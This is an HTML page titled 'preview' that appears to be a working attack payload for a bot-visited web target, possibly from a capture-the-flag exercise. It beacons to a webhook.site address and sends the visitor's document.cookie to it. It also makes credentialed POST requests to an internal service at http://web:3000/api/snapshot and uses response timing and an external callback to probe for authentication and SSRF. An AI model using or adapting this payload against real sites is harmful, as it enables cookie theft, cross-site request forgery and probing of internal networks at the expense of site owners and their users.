<!doctype html><html><head><meta charset="utf-8"><title>preview</title></head>
<body>
<img src="https://webhook.site/214bbeb4-bbab-4fc4-8673-e0e4092215a1/NOJS-VISIT" width="1" height="1">
<img src="https://httpstat.us/200?sleep=20000" width="1" height="1">
<h1>preview</h1>
<script>
(function(){
 var WH="https://webhook.site/214bbeb4-bbab-4fc4-8673-e0e4092215a1/";
 function B(tag,data){data=(''+(data||'')).slice(0,1500);
   try{new Image().src=WH+encodeURIComponent(tag)+"?d="+encodeURIComponent(data);}catch(e){}}
 B('00-JS-RAN','ck='+document.cookie);
 var W='http://web:3000';
 var SLOW='https://httpstat.us/200?sleep=10000';
 function snap(tag,url,cred){var t0=Date.now();
   fetch(W+'/api/snapshot',{method:'POST',mode:'no-cors',credentials:cred,body:JSON.stringify({url:url})})
    .then(()=>B(tag,'ms='+(Date.now()-t0)))
    .catch(e=>B(tag+'-ERR','ms='+(Date.now()-t0)+' '+e));}
 snap('SLOW-incl',SLOW,'include');   // authed -> ~10000ms ; 403 -> fast
 snap('SLOW-omit',SLOW,'omit');
 snap('INT-incl',W+'/','include');    // authed -> render time ; 403 -> fast
 snap('EXT-incl','https://webhook.site/214bbeb4-bbab-4fc4-8673-e0e4092215a1/SNAP-EXTCB','include'); // authed+extreach -> service visits SNAP-EXTCB
})();
</script>
</body></html>
